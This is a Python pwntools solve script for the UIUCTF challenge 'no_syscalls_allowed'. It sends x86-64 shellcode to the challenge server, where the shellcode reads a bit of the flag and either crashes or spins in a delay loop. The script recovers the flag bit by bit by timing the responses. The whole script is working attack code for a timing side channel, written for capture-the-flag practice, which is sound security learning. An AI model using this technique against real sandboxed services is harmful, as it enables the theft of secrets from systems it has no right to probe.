#!/bin/env python3
from pwn import *
from time import time, sleep
import numpy as np

context.arch = 'amd64'

def NormalizeData(data):
    return (data - np.min(data)) / (np.max(data) - np.min(data))

def leak(main_offset: int, length: int) -> str:
    flag = ""
    shift_right = "shr al\n"
    for i in range(main_offset, main_offset+length):
        byte_times = []
        for b in range(0,8):

            shellcode = asm(f"""
            add r13, {i}
            mov rax, [r13]
            {shift_right * b}
            and rax, 1

            cmp rax, 0
            je exit

            mov rcx, 0
            mov rdx, 0x8000
            loop:
                mov r8, 0
                mov r9, 0x8000
                innerloop:
                    inc r8
                    cmp r8, r9 
                    jbe innerloop
                inc rcx
                cmp rcx, rdx 
                jbe loop
            exit:
                mov rax, [0]
            """)

            gdb_script = """
            set disassembly-flavor intel
            disp/8i $rip
            b *main+166
            c
            """
            #p = process("./no_syscalls_allowed")
            #gdb.attach(p, gdbscript=gdb_script)
            p = remote("no-syscalls-allowed.chal.uiuc.tf", 1337)
            p.recvuntil(b"== proof-of-work: disabled ==")
            start=time()
            p.sendline(shellcode)
            p.recvall()
            duration = time()-start
            byte_times.append(duration)
            print(f"took {duration} seconds")
        byte_times = NormalizeData(byte_times)*1000
        byte = "" 
        for t in byte_times[::-1]:
            if t < 100:
                byte += "0"
            else:
                byte += "1"
        byte_chr = chr(int(byte,2))
        flag += byte_chr
        print(f"byte at {main_offset:#x}: {byte_chr}")
        if byte_chr == "}":
            break
    return flag


#Leaked instr:
#<CsInsn 0x0 [488d356f2e0000]: lea rsi, [rip + 0x2e6f]>

# offset from main -> lea instruction 
# + length of instruction
# + rip relative offset
flag_offset = 0x30 + 0x7 + 0x2e6f
prefix = "uiuctf{"
flag = leak(flag_offset+len(prefix), 0x64)
print(prefix+flag)

